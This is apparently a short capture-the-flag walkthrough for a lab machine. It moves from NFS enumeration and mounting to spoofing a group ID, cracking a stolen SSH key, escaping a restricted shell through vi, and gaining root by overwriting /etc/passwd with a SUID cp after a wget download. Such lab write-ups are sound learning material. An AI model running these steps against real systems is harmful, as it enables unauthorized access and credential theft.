- 1- Let's started with scanning the target machine that reveals an important port open:
2049 -> open -> NFS Share.
- 2- Enumerating the shared files : ```showmount -e 10.0.4.36 ```
- 3- Mounting the shared directory: ```mount -t nfs 10.0.4.36:/home/karl /tmp/share ```
- 4- Get in the karl directory 
- 5- Create a group identifiant 1001: ``` groupadd -g 1001 mygroup```
- 6- Affecte my user account to the group created: ``` useradd -G mygroup root``` => we can access to .ssh shared file
- 7- Upload his private ssh key -> use ssh2john to retrieve the passphrase.
8- Connect with private ssh to rbash shell
9- Abuse vi to get out from the restricted bash: ``` vi -> :!/bin/sh```
10- ``` find / -perm -u=s -type f 2>/dev/null```
11- /bin/cp: can be runned as root user.
12- ```wget http://10.0.4.36:8000/passwd  -> cp passwd /etc/passwd -> su tbag (root user)```
